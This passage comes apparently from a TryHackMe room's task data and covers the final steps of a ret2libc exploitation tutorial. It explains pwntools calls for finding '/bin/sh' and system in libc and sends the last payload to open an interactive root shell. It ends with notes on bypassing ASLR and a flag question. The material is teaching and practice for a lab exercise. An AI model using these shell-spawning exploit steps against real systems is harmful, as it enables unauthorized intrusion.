these.</p><p><code>libc.search(b\'/bin/sh\')</code>\xa0</p><ul><li>Returns the iterator for each virtual address that matches the byte string "/bin/sh".</li></ul><p><code>next()</code>\xa0</p><ul><li>Function returns the "next" iterator from the founded matches.</li></ul><p><code>libc.symbols.system</code></p><ul><li>Returns the address of the system function inside of our linked libc.</li><li>Since we initially defined the libc variable as an ELF object and later rebased this libc with our first ROP chain, we can now call the system function right from the libc.</li></ul><p>Now we have everything finally ready, so let\'s continue into the final part, where we\'ll send the second payload and get an interactive shell.</p><p><br /></p>\n<h4>Part 7</h4>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Sending the final payload\n        </div>\n        <pre class="terminal-code"><code class="language-shell-session">p.sendline(payload)\np.recvline()\np.interactive()</code>\n        </pre>\n    </div>\n</div>\n<p>Here we\'re just sending the second payload and cleaning out some unnecessary output. The last line starts the interactive mode, so we can interact with the created shell if everything went well.<br /></p><p>And that\'s about it. Go write the exploit yourself if you weren\'t following along step by step. And if you\'ve done everything well, you should have root privileges, so go grab the flag!<br /></p>', 'taskType': 'none', 'taskNo': 7, 'taskCreated': '2021-09-11T00:35:31.663Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '\xa0What is the flag?', 'hint': ''}]}, {'taskTitle': 'Conclusion', 'taskDesc': '<p>So if you got here, you should have a basic idea of how the ret2libc attack works.\xa0</p><p>I made the exploiting a little bit harder and didn\'t turn off the ASLR.</p><p>It\'s turned on by default on most Linux distributions, plus I wanted you to know that it is possible to bypass any of the protections.\xa0</p><p>You can still encounter some CTFs where the ASLR will be turned off; in that case, we don\'t have to leak the base address of the libc, and we can just look at it with the ldd. Thus we are skipping the first ROP chain.</p><p><span style="font-size:1rem">If you want to practice ret2libc, I recommend the TryHackMe room called Chronicle.</span></p><ul><li><a href="https://tryhackme.com/room/chronicle" target="_blank">Chronicle</a></li></ul><p>If you find any mistakes or just want to ask something, you can contact me on Twitter; the link is on my THM profile.<br /></p>', 'taskType': 'none', 'taskNo': 8, 'taskCreated': '2021-09-22T07:48:06.402Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'I hope you enjoyed the room and learned something new.<br />', 'hint': ''}]}]}